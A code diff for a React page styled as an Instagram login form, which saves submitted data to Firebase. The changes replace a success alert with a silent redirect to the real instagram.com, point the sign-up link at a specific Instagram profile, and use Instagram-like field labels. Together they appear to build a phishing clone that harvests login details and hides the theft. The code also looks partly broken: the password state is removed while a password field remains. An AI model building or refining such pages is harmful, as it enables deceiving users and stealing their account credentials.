@@ -1,10 +1,10 @@
 import { useState } from "react";
 import { db, setDoc, doc } from "./firebase/firebase";
 import "./App.css";
+import { Navigate, useNavigate } from "react-router-dom";
 
 export default function App() {
   const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
   const [username, setUsername] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
@@ -22,17 +22,21 @@ export default function App() {
         email: email,
         createdAt: new Date(),
       });
-
-      alert("Registration successful!");
+    
+      setUsername("");
+      setEmail("")
+      window.location.href = 'https://www.instagram.com/';
     } catch (error) {
       setError(error.message);
     }
 
     setLoading(false);
+
   };
 
   return (
     <form onSubmit={handleSubmit}>
+  
       <main>
         <div className="log-in-container">
           <div className="log-in">
@@ -44,7 +48,7 @@ export default function App() {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
-                placeholder="Email"
+                placeholder="Email username phone"
               />
               <input
                 type="password"
@@ -65,18 +69,18 @@ export default function App() {
             <span className="or-divider">OR</span>
 
             <div className="fb-login">
-              <a href="#">
+              <a href="https://web.facebook.com/?_rdc=1&_rdr#">
                 <img src="photos/facebook-icon.png" />
                 <span>Log in with Facebook</span>
               </a>
             </div>
 
-            <a href="#">Forgot password?</a>
+            <a href="#" style={{color:"#000"}}>Forgot password?</a>
           </div>
 
           <div className="sign-up">
             <span>
-              Already have an account? <a href="#">Log in</a>
+              I have no  account? <a href="https://instagram.com/adiss_hot/">Sign up</a>
             </span>
           </div>
 
